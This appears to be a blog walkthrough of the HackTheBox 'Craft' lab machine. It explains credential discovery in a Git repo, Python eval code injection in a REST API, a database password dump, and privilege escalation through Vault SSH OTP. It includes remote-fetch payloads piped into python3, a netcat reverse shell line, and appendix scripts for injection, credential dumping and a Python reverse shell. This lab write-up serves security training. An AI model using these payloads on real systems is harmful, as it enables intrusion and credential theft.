---
layout: page
title: HackTheBox - Craft
categories: [hackthebox]
tags: [hackthebox, ctf, medium, linux, python, vault]
---
[1]: https://www.vaultproject.io/ "Vault by HashiCorp"
[2]: https://gogs.io/ "Gogs is a self-hosted Git service"
[3]: https://www.hackthebox.eu/home/machines/profile/197 "HackTheBox: Craft"
[4]: https://docs.python.org/3/library/functions.html?highlight=eval#eval "Python3 eval function"
[5]: https://docs.python.org/3/library/os.html?highlight=os#module-os "Python3 os.system"
[6]: https://docs.python.org/3/reference/simple_stmts.html#import "Python3 Import statement"
[7]: https://docs.python.org/3/library/functions.html#__import__ "Python3 __import__ function"

This blog explains HackTheBox's [Craft][3] machine in 3 levels of detail. First, as a [short list of steps](#summary). Then, as a [conventional walkthrough](#walkthrough). Last, I [examine how injecting code into python's eval function works](#why-it-works), and how to use modules that aren't already imported.

Any custom scripts can be found in the [appendix](#appendix).

___

## **Summary**

1. [Find credentials](#enumeration) in the commit history of [Gogs][2] repo. 
2. [Exploit *eval* function](#initial-exploit) in REST API, giving root access to API's container deployment.
3. Use that access to [dump local database](#local-enumeration-of-container) containing plaintext credentials.
4. [Use credentials at Gogs](#return-to-gogs) to view private repo containing SSH key to main machine. Reuse Gogs password for ssh key.
5. Use [Vault][1] ssh otp to [log in as root](#privilege-escalation).

___

## **Walkthrough**

# **Enumeration**

   | PORT | SERVICE | NOTES
   --- | --- | --- 
   22 (TCP) | OpenSSH 7.4p1 Debian 10+deb9u5 | 
   443 (TCP) | nginx 1.15.8 | SSL cert shows **_craft.htb_** domain

   Web service on port 443 is most interesting. Prepare to edit */etc/hosts* with domains. 

   Browsing to https://10.10.10.110/ we see that Craft is a repository of craft beers accessible via REST api. Nothing else stands out except two links in the corner of the home page: **https://api.craft.htb/api/** and **https://gogs.craft.htb/** 

   Access these subdomains by adding the following to /etc/hosts:
   > 10.10.10.110    craft.htb api.craft.htb gogs.craft.htb

   [Gogs is a self-hosted git service][2], and the most immediately interesting target because like to leave important credentials in git repos. There is one publically viewable repo: https://gogs.craft.htb/Craft/craft-api.

   There are only 6 commits, and one commit has the message "Cleanup test", right after a commit adding a test script. The commit removed the following line containing hard-coded credentials:
   > response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
   
   Credentials:
   > **dinesh**:**4aUh0A8PbVJxgd**

   The creds are valid for Gogs and the API. The API uses basic authentication to get a token, so the credentials can be validated with the following command:
   ```bash
   curl -X GET https://api.craft.htb/api/auth/login  \
   -H  "accept: application/json" -u dinesh:4aUh0A8PbVJxgd -k
   ```

   Now there is a large attack surface between Gogs and the API. The source code on Gogs is the best way to understand the API, so I start there.

   Note: tested for CVE-2018-20303 [using gogsownz.py](https://github.com/TheZ3ro/gogsownz) but the site said it detected a malicious path. 

   Browsing "issues" shows a problem with the function creating a new brew. It was hastily fixed and is vulnerable to code injection b/c of it's use of python's "eval" function.

# **Initial Exploit**

The vulnerable code is found in the API's *brew* endpoint, which allows users to create a new brew via a POST request.
The vulnerable snippet:
```python
if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
else:
    create_brew(request.json)
    return None, 201
```

[I explain the exploitation of Python's eval function in greater in depth later](#python-eval-injection), but this section should provide enough info to replicate the attack.

Exploitation requires authenticating to the API, then sending a malicious payload in the 'abv' value:
> __import__("os").system("wget -q -O- http://10.10.14.28/shell.py | python3")

The payload is sent in json via a POST to *https://api.craft.htb/api/brew*. An example payload:
```js
{
    "id": 4222,
    "brewer": "Stewy Brewy",
    "name": "SplashTown Heckahol",
    "style": "YPA",
    "abv": '__import__("os").system("wget -q -O- http://10.10.14.28/shell.py | python3 &")' 
}
```

This command imports the *os* module (which is not imported to brew.py), then calls wget (curl isn't available) to download a [simple python3 shell](#shellpy), outputting to stdout, which is piped into python3. I like this method more than downloading a shell and executing it, because it doesn't require any file writes, and is probably better opsec.

There are other methods, but that worked. The process to find what worked took a while, and I [wrote a script](#injection_exploitpy) to automate the code injection so I could find a command to get shell more easily. 

This exploit gives a shell as "root" of a machine at *172.20.0.6*


# **Local Enumeration of Container**

   Now I can browse more of the app's source, including the database models and scripts, which weren't in the Gogs repo.

   Find database credentials at */opt/app/craft_api/settings.py*:
   ```python
   MYSQL_DATABASE_USER = 'craft'
   MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
   MYSQL_DATABASE_DB = 'craft'
   MYSQL_DATABASE_HOST = 'db'
   ```

   I want the user info in the database, but there's no easy way to do it because there's not obvious mysql client installed, and there is also no bash, so I can't get a pty. Instead, I copy their dbtest.py script to my host machine, and [edit it to dump the users](#db_dumppy). I copy this back via wget and execute.

   The creds are dumped in plaintext:
   > dinesh:4aUh0A8PbVJxgd
   >
   > **ebachman**:**llJ77D8QFkLPQB**
   >
   > **gilfoyle**:**ZEU3N8WNM2rh4T**

   These are good passwords, but that's irrelevant when they're stored in plaintext.

# **Return to Gogs** 

   Gilfoyle's password is valid at gogs.craft.htb, and he has a private repo called *craft-infra* with important infrastructure. Notably, there is an ssh private key, and a directory related to a Vault docker deployment.

   The ssh key is valid for gilfoyle@craft.htb, and requires a passphrase to complete authentication. The passphrase is the same as the Gogs password (lol).

# **Privilege Escalation**

   Running *ip addr* shows this machine is the main target, with the address *10.10.10.110*. There is a lot going on, network-wise, but it's mostly a rabbit-hole. It's just important to remember that Vault is running in a locally-networked docker container. 

   Run **_vault secrets list_** to show Vault's stored secrets.

   *Path* | *Type* | *Accessor* | *Description*
   --- | --- | --- | ---
   cubbyhole/ | cubbyhole | cubbyhole_ffc9a6e5 | per-token private secret storage
   identity/ | identity | identity_56533c34 | identity store
   secret/ | kv | kv_2d9b0109 | key/value secret storage
   ssh/ | ssh | ssh_3bbd5276 | n/a
   sys/ | system | system_477ec595 | system endpoints used for control, policy and debugging


   The ssh secret is interesting. It can be used with:
   
   ```bash
   vault ssh -mode=otp root@craft.htb
   ```

You'll be prompted for a password, which is simply the OTP printed in the first few lines of output:

> OTP for the session is: **9fa524fb-1bda-d5a2-c4d4-8e020c635e0e**

Copy/paste the OTP to become root. 

___

## **Why It Works**

# Python Eval Injection

The [eval function in Python][4] takes strings and runs them as python code. In order for the code to execute, the syntax must be valid.

Example: I'm trying to inject into the following snippet:
```python
eval('%s > 1' % x)
```
Here 1 is an int, so *x* must be of a type that can be compared to an int. Basically, that means an int or a float. Strings, dictionaries, and lists will result in a syntax error and the code won't be evaluated.

The trick is that you can validly pass functions/objects that return integers, and it's not always intuitive what returns an integer:

```python
type("1")                   # string
type(int("1"))              # int
type(os.listdir())          # list
type(os.system("whoami"))   # int...
```

[Calls to os.sytem don't return the output][5]; they return the status code indicating how the operation completed (e.g. 0 for success, 1 for error), and the output is sent to Python's standard output. Consequently, this is valid python:
```python
eval('os.system("nc -e /bin/bash 10.10.14.23 443") < 1111')     # True
```

By default, the eval function exposes the global and local contexts to the code it's evaluation. This means you can use any imported modules, and reference variables available in the context of the calling function (although you can't assign variables). That's why calls to os.system would work if brew.py had imported *os*. Unfortunately it's brew.py did not import *os*, nor did it import any other useful modules (e.g. subprocess).

Import statements, which [bind the imported module to the local namespace][6], can't be used in the eval function, which does not support assignment. This can be tested in the python console
```python
x = 10
eval('x')           # 10
eval('x = 12')      # ERROR
eval('y = 12')      # ERROR
eval('import os')   # ERROR
```

This problem can be avoided by using the function *import* actually implements: [*\_\_import\_\_*][7]. Whereas *import* loads a module and makes it available to the local namespace, *\_\_import\_\_* simply loads the module and returns it. The return can be used to assign to a variable or chained to call module functions. Tested in the console:
```python
test = __import__("os")
os.system("whoami")                 # ERROR b/c os not in namespace
test.system("whoami")               # Executes os.system function
__import__("os").system("whoami")   # Executes os.system function
```
This info can be chained together to exploit Craft's API. The vulnerable snippet: 
```python
if eval('%s > 1' % request.json['abv']):
    return "ABV must be a decimal value less than 1.0", 400
else:
    create_brew(request.json)
    return None, 201
```

Note that it doesn't matter whether the input passes the conditional, as long as it's executing the code. The payload is sent in json via a POST to *https://api.craft.htb/api/brew*. An example payload:
```js
{
    "id": 4222,
    "brewer": "Stewy Brewy",
    "name": "SplashTown Heckahol",
    "style": "YPA",
    "abv": '__import__("os").system("wget -q -O- http://10.10.14.28/shell.py | python3 &")' 
}
```

This results in the following code being run on the victim: 
```python
eval('__import__("os").system("wget -q -O- http://10.10.14.28/shell.py | python3 &") > 1')
```

Because the payload returns an int, this is valid python and will be executed.
```python
type(__import__("os").system("wget -q -O- http://10.10.14.28/shell.py | python3 &"))
# <class 'int'>
```

[Complete exploit code can be found in the appendix.](#injection_exploitpy)  

___


## **Appendix**

# injection_exploit.py

```python 
#!/usr/bin/env python3
import argparse
import requests


# Globals
username = "dinesh"
password = "4aUh0A8PbVJxgd"
target_url = "https://api.craft.htb/api/brew/"
auth_url = "https://api.craft.htb/api/auth/login"


# Returns token
def authenticate():
    global username, password, auth_url

    r = requests.get(auth_url, auth=(username, password), verify=False)
    return r.json()['token']


def exploit(command, token):
    global target_url

    # Let's just inject shell commands
    injection_format = '''__import__("os").system("{} &")'''
    inject = injection_format.format(command)

    # To be sent as json
    payload = {
        "id": 4222,
        "brewer": "Stewy Brewy",
        "name": "SplashTown Heckahol",
        "style": "YPA",
        "abv": inject
    }

    headers = {
        "X-Craft-API-Token": token
    }

    r = requests.post(target_url, json=payload, headers=headers, verify=False)
    print(r.content)


def main():
    token = authenticate()
    exploit(args.command, token)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "command",
        help="Command or code to inject as exploit"
    )
    args = parser.parse_args()

    main()
```

# db_dump.py

```python
#!/usr/bin/env python
import pymysql

# Hard-coded connection info so no need to write to app directory
connection = pymysql.connect(
    host="db",
    user="craft",
    password="qLGockJ6G2J75O",
    db="craft",
    cursorclass=pymysql.cursors.DictCursor
)

try:
    with connection.cursor() as c:
        sql = "SELECT `username`,`password` from `user`"
        c.execute(sql)
        result = c.fetchall()
        print(result)
except Exception as e:
    print(e)
finally:
    connection.close()
```

# shell.py
```python
#!/usr/bin/env python3
import os
import socket
import subprocess

lhost = "10.10.14.28"
lport = 443

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
```
